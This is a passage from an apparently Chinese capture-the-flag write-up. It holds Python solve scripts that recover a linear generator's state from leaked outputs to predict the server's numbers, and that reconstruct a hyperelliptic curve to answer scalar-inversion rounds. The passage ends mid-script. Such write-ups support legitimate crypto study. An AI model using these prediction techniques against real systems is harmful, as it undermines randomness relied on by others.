class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> rows:</span><br><span class="line">        acc = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">512</span>):</span><br><span class="line">            <span class="keyword">if</span> parity(r &amp; Acols[j]):</span><br><span class="line">                acc |= (<span class="number">1</span> &lt;&lt; j)</span><br><span class="line">        new_rows.append(acc)</span><br><span class="line">    <span class="keyword">return</span> new_rows</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">precompute_R_and_k</span>(<span class="params">T=<span class="number">8</span></span>):</span><br><span class="line">    P_rows = [(<span class="number">1</span> &lt;&lt; i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>)]</span><br><span class="line">    row_t = P_rows.copy()</span><br><span class="line">    ct = <span class="number">0</span></span><br><span class="line">    R_list, k_list = [], []</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(T):</span><br><span class="line">        row_t = rows_times_A(row_t)</span><br><span class="line">        ct = A_times_vec(ct) ^ Cvec</span><br><span class="line">        k_bits = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">            <span class="keyword">if</span> parity(P_rows[r] &amp; ct):</span><br><span class="line">                k_bits |= (<span class="number">1</span> &lt;&lt; r)</span><br><span class="line">        R_list.append(row_t.copy())</span><br><span class="line">        k_list.append(k_bits)</span><br><span class="line">    <span class="keyword">return</span> R_list, k_list</span><br><span class="line"></span><br><span class="line">R_list, k_list = precompute_R_and_k(T=<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_linear_system</span>(<span class="params">known64</span>):</span><br><span class="line">    rows = []</span><br><span class="line">    rhs  = []</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        y = known64[t]</span><br><span class="line">        eq_rhs64 = y ^ k_list[t]</span><br><span class="line">        <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">            rows.append(R_list[t][r])</span><br><span class="line">            rhs.append((eq_rhs64 &gt;&gt; r) &amp; <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> rows, rhs</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gf2_solve_and_nullspace</span>(<span class="params">rows, rhs, n=<span class="number">512</span></span>):</span><br><span class="line">    rows = rows[:]</span><br><span class="line">    rhs  = rhs[:]</span><br><span class="line">    m = <span class="built_in">len</span>(rows)</span><br><span class="line">    pivot = [-<span class="number">1</span>]*n</span><br><span class="line">    r = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        piv = -<span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(r, m):</span><br><span class="line">            <span class="keyword">if</span> (rows[i] &gt;&gt; col) &amp; <span class="number">1</span>:</span><br><span class="line">                piv = i</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> piv == -<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> piv != r:</span><br><span class="line">            rows[r], rows[piv] = rows[piv], rows[r]</span><br><span class="line">            rhs[r],  rhs[piv]  = rhs[piv],  rhs[r]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">            <span class="keyword">if</span> i != r <span class="keyword">and</span> ((rows[i] &gt;&gt; col) &amp; <span class="number">1</span>):</span><br><span class="line">                rows[i] ^= rows[r]</span><br><span class="line">                rhs[i]  ^= rhs[r]</span><br><span class="line">        pivot[col] = r</span><br><span class="line">        r += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> r == m:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        pr = pivot[col]</span><br><span class="line">        <span class="keyword">if</span> pr != -<span class="number">1</span> <span class="keyword">and</span> rhs[pr]:</span><br><span class="line">            x |= (<span class="number">1</span> &lt;&lt; col)</span><br><span class="line">    <span class="comment"># nullspace basis</span></span><br><span class="line">    free = [c <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(n) <span class="keyword">if</span> pivot[c] == -<span class="number">1</span>]</span><br><span class="line">    basis = []</span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> free:</span><br><span class="line">        v = <span class="number">1</span> &lt;&lt; f</span><br><span class="line">        <span class="keyword">for</span> c, pr <span class="keyword">in</span> <span class="built_in">enumerate</span>(pivot):</span><br><span class="line">            <span class="keyword">if</span> pr != -<span class="number">1</span> <span class="keyword">and</span> ((rows[pr] &gt;&gt; f) &amp; <span class="number">1</span>):</span><br><span class="line">                v |= (<span class="number">1</span> &lt;&lt; c)</span><br><span class="line">        basis.append(v)</span><br><span class="line">    <span class="keyword">return</span> x, basis</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">next_state</span>(<span class="params">a: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> A_times_vec(a) ^ Cvec</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_outputs_from_a0</span>(<span class="params">a0: <span class="built_in">int</span>, total=<span class="number">20</span></span>):</span><br><span class="line">    outs = []</span><br><span class="line">    a = a0</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(total):</span><br><span class="line">        a = next_state(a)</span><br><span class="line">        outs.append(a &amp; ((<span class="number">1</span> &lt;&lt; <span class="number">64</span>) - <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> outs</span><br><span class="line"></span><br><span class="line">CHARS = (string.ascii_letters + string.digits).encode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pow_worker</span>(<span class="params">args</span>):</span><br><span class="line">    first, suffix_bytes, target_digest = args</span><br><span class="line">    <span class="keyword">for</span> c1 <span class="keyword">in</span> CHARS:</span><br><span class="line">        <span class="keyword">for</span> c2 <span class="keyword">in</span> CHARS:</span><br><span class="line">            <span class="keyword">for</span> c3 <span class="keyword">in</span> CHARS:</span><br><span class="line">                pref = <span class="built_in">bytes</span>((first, c1, c2, c3))</span><br><span class="line">                <span class="keyword">if</span> hashlib.sha256(pref + suffix_bytes).digest() == target_digest:</span><br><span class="line">                    <span class="keyword">return</span> pref.decode()</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_pow</span>(<span class="params">suffix: <span class="built_in">str</span>, digest_hex: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    suffix_bytes = suffix.encode()</span><br><span class="line">    target_digest = <span class="built_in">bytes</span>.fromhex(digest_hex)</span><br><span class="line">    <span class="keyword">with</span> mp.Pool(processes=<span class="built_in">min</span>(<span class="built_in">len</span>(CHARS), <span class="built_in">max</span>(<span class="number">2</span>, mp.cpu_count() <span class="keyword">or</span> <span class="number">2</span>))) <span class="keyword">as</span> pool:</span><br><span class="line">        <span class="keyword">for</span> res <span class="keyword">in</span> pool.imap_unordered(</span><br><span class="line">            pow_worker, [(c0, suffix_bytes, target_digest) <span class="keyword">for</span> c0 <span class="keyword">in</span> CHARS], chunksize=<span class="number">1</span></span><br><span class="line">        ):</span><br><span class="line">            <span class="keyword">if</span> res:</span><br><span class="line">                pool.terminate()</span><br><span class="line">                <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;PoW not found&quot;</span>)</span><br><span class="line"></span><br><span class="line">LIST_RE = re.<span class="built_in">compile</span>(<span class="string">r&quot;\[\s*\d+(?:\s*,\s*\d+)*\s*\]&quot;</span>)</span><br><span class="line">HASH_RE = re.<span class="built_in">compile</span>(<span class="string">r&quot;\b[0-9a-f]&#123;64&#125;\b&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recv_known_and_hint</span>(<span class="params">io</span>):</span><br><span class="line">    buf = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        line = io.recvline(timeout=<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> line:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        buf += line</span><br><span class="line">        s = buf.decode(errors=<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line">        m_list = LIST_RE.search(s)</span><br><span class="line">        m_hash = HASH_RE.search(s)</span><br><span class="line">        <span class="keyword">if</span> m_list <span class="keyword">and</span> m_hash:</span><br><span class="line">            known = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, re.findall(<span class="string">r&quot;\d+&quot;</span>, m_list.group(<span class="number">0</span>))))</span><br><span class="line">            hint = m_hash.group(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> known, hint, s</span><br><span class="line">    <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;failed to parse known/hint; buffer so far:\n<span class="subst">&#123;buf!r&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    io = remote(HOST, PORT)</span><br><span class="line"></span><br><span class="line">    data = io.recvuntil(<span class="string">b&quot;Give me XXXX:&quot;</span>)</span><br><span class="line">    m = re.search(</span><br><span class="line">        <span class="string">rb&quot;sha256\(XXXX \+ ([A-Za-z0-9]&#123;16&#125;)\) == ([0-9a-f]&#123;64&#125;)&quot;</span>,</span><br><span class="line">        data,</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">assert</span> m, <span class="string">&quot;PoW format not matched&quot;</span></span><br><span class="line">    suffix = m.group(<span class="number">1</span>).decode()</span><br><span class="line">    digest_hex = m.group(<span class="number">2</span>).decode()</span><br><span class="line">    x = solve_pow(suffix, digest_hex)</span><br><span class="line">    io.sendline(x.encode())</span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Level:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line">    known, hint_line, _ = recv_known_and_hint(io)</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(known) == <span class="number">8</span>, <span class="string">f&quot;expect 8 leaks, got <span class="subst">&#123;<span class="built_in">len</span>(known)&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    rows, rhs = build_linear_system(known)</span><br><span class="line">    a0_part, basis = gf2_solve_and_nullspace(rows, rhs)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">hash20</span>(<span class="params">seq</span>):</span><br><span class="line">        <span class="keyword">return</span> hashlib.sha256(<span class="string">&quot;&quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, seq)).encode()).hexdigest()</span><br><span class="line"></span><br><span class="line">    outputs = gen_outputs_from_a0(a0_part, <span class="number">20</span>)</span><br><span class="line">    <span class="keyword">if</span> hash20(outputs) != hint_line:</span><br><span class="line">        d = <span class="built_in">len</span>(basis)</span><br><span class="line">        <span class="keyword">if</span> d &lt;= <span class="number">20</span>:</span><br><span class="line">            cand = a0_part</span><br><span class="line">            best = <span class="literal">None</span></span><br><span class="line">            <span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line">            <span class="keyword">for</span> bits <span class="keyword">in</span> product([<span class="number">0</span>,<span class="number">1</span>], repeat=d):</span><br><span class="line">                a0 = a0_part</span><br><span class="line">                <span class="keyword">for</span> i,b <span class="keyword">in</span> <span class="built_in">enumerate</span>(bits):</span><br><span class="line">                    <span class="keyword">if</span> b: a0 ^= basis[i]</span><br><span class="line">                seq = gen_outputs_from_a0(a0, <span class="number">20</span>)</span><br><span class="line">                <span class="keyword">if</span> hash20(seq) == hint_line:</span><br><span class="line">                    outputs = seq</span><br><span class="line">                    best = a0</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> best <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;no candidate in nullspace matches hint&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;hint mismatch and nullspace too large (dim=<span class="subst">&#123;d&#125;</span>)&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">        io.recvuntil(<span class="string">b&quot;guess:&quot;</span>)</span><br><span class="line">        io.sendline(<span class="built_in">str</span>(outputs[i]).encode())</span><br><span class="line"></span><br><span class="line">    final = io.recvall(timeout=<span class="number">3</span>).decode(errors=<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(final.strip())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>ZJUCTF{U_@irEad1_kn0w_CRC_1s_lIneaR}</p>
<h3 id="Curve2"><a href="#Curve2" class="headerlink" title="Curve2"></a>Curve2</h3><ul>
<li>解析题面打印的 Jacobian 元素 $(u(x),v(x))$；利用 Mumford 表示满足的恒等式 $v(x)^2 \equiv f(x)\pmod{u(x)}$。</li>
<li>累积几轮给出的 $(u,v)$ 建立关于 $f(x)&#x3D;x^5+a_4x^4+\cdots+a_0$ 的线性方程，解出系数重建超椭圆曲线。</li>
<li>在本地构造该曲线与其 Jacobian，计算 $|J(\mathbb F_p)|&#x3D;L(1)$（由 L-polynomial &#x2F; zeta function 得到），再降幂求出 $\operatorname{ord}(D)$。</li>
<li>预先计算所有 16-bit 质数 $q$ 的 $qD$ 表；每轮把收到的 $D_2&#x3D;kD$ 在表中匹配出 $k$。</li>
<li>计算 $k_2\equiv k^{-1}\pmod{\operatorname{ord}(D)}$ 回答；遇到无逆或解析失败的回合直接丢弃，凭 ≥15&#x2F;20 轮正确拿到 flag。</li>
</ul>
<p>exp.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">PORT = <span class="number">61234</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">term_re = re.<span class="built_in">compile</span>(<span class="string">r&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    (?P&lt;sign&gt;[+\-]?)\s*</span></span><br><span class="line"><span class="string">    (?:</span></span><br><span class="line"><span class="string">        (?:(?P&lt;c&gt;\d+)\s*\*?\s*)?x</span></span><br><span class="line"><span class="string">        (?:\s*\^\s*(?P&lt;e&gt;\d+))?</span></span><br><span class="line"><span class="string">      |</span></span><br><span class="line"><span class="string">        (?P&lt;const&gt;\d+)</span></span><br><span class="line"><span class="string">    )</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>, re.VERBOSE)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_poly_to_coeffs</span>(<span class="params">poly_str</span>):</span><br><span class="line">    s = poly_str.strip()</span><br><span class="line">    <span class="keyword">if</span> s == <span class="string">&quot;&quot;</span> <span class="keyword">or</span> s == <span class="string">&quot;0&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> [<span class="number">0</span>]</span><br><span class="line">    s = s.replace(<span class="string">&quot;**&quot;</span>,<span class="string">&quot;^&quot;</span>).replace(<span class="string">&quot;·&quot;</span>,<span class="string">&quot;*&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> s[<span class="number">0</span>] <span class="keyword">not</span> <span class="keyword">in</span> <span class="string">&quot;+-&quot;</span>:</span><br><span class="line">        s = <span class="string">&quot;+&quot;</span> + s</span><br><span class="line">    coeffs = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> term_re.finditer(s):</span><br><span class="line">        sign = -<span class="number">1</span> <span class="keyword">if</span> m.group(<span class="string">&quot;sign&quot;</span>) == <span class="string">&quot;-&quot;</span> <span class="keyword">else</span> <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> m.group(<span class="string">&quot;const&quot;</span>) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            c = <span class="built_in">int</span>(m.group(<span class="string">&quot;const&quot;</span>)) * sign</span><br><span class="line">            e = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            c = <span class="number">1</span> <span class="keyword">if</span> m.group(<span class="string">&quot;c&quot;</span>) <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="built_in">int</span>(m.group(<span class="string">&quot;c&quot;</span>))</span><br><span class="line">            c *= sign</span><br><span class="line">            e = <span class="number">1</span> <span class="keyword">if</span> m.group(<span class="string">&quot;e&quot;</span>) <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="built_in">int</span>(m.group(<span class="string">&quot;e&quot;</span>))</span><br><span class="line">        coeffs[e] = coeffs.get(e, <span class="number">0</span>) + c</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> coeffs:</span><br><span class="line">        <span class="keyword">return</span> [<span class="number">0</span>]</span><br><span class="line">    deg = <span class="built_in">max</span>(coeffs.keys())</span><br><span class="line">    out = [<span class="number">0</span>]*(deg+<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> e,v <span class="keyword">in</span> coeffs.items():</span><br><span class="line">        out[e] = v</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(out) &gt; <span class="number">1</span> <span class="keyword">and</span> out[-<span class="number">1</span>] == <span class="number">0</span>:</span><br><span class="line">        out.pop()</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">strip_brackets</span>(<span class="params">s</span>):</span><br><span class="line">    s = s.strip()</span><br><span class="line">    <span class="keyword">if</span> s <span class="keyword">and</span> s[<span class="number">0</span>] <span class="keyword">in</span> <span class="string">&quot;([&#123;&quot;</span> <span class="keyword">and</span> s[-<span class="number">1</span>] <span class="keyword">in</span> <span class="string">&quot;)]&#125;&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> s[<span class="number">1</span>:-<span class="number">1</span>].strip()</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_uv_block</span>(<span class="params">line</span>):</span><br><span class="line">    i = line.find(<span class="string">&#x27;[&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> i != -<span class="number">1</span>:</span><br><span class="line">        depth = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i, <span class="built_in">len</span>(line)):</span><br><span class="line">            <span class="keyword">if</span> line[j] == <span class="string">&#x27;[&#x27;</span>:</span><br><span class="line">                depth += <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> line[j] == <span class="string">&#x27;]&#x27;</span>:</span><br><span class="line">                depth -= <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> depth == <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">return</span> line[i+<span class="number">1</span>:j]</span><br><span class="line">    start = line.find(<span class="string">&#x27;D=&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> start == -<span class="number">1</span>:</span><br><span class="line">        start = line.find(<span class="string">&#x27;D2=&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> start == -<span class="number">1</span>:</span><br><span class="line">        start = <span class="number">0</span></span><br><span class="line">    s2 = line[start:]</span><br><span class="line">    k = s2.find(<span class="string">&#x27;(&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> k != -<span class="number">1</span>:</span><br><span class="line">        depth = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(k, <span class="built_in">len</span>(s2)):</span><br><span class="line">            <span class="keyword">if</span> s2[j] == <span class="string">&#x27;(&#x27;</span>:</span><br><span class="line">                depth += <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> s2[j] == <span class="string">&#x27;)&#x27;</span>:</span><br><span class="line">                depth -= <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> depth == <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">return</span> s2[k+<span class="number">1</span>:j]</span><br><span class="line">    <span class="keyword">return</span> line</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">split_u_v</span>(<span class="params">block</span>):</span><br><span class="line">    parts = block.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(parts) &lt; <span class="number">2</span>:</span><br><span class="line">        i = block.rfind(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> i != -<span class="number">1</span>:</span><br><span class="line">            parts = [block[:i], block[i+<span class="number">1</span>:]]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span 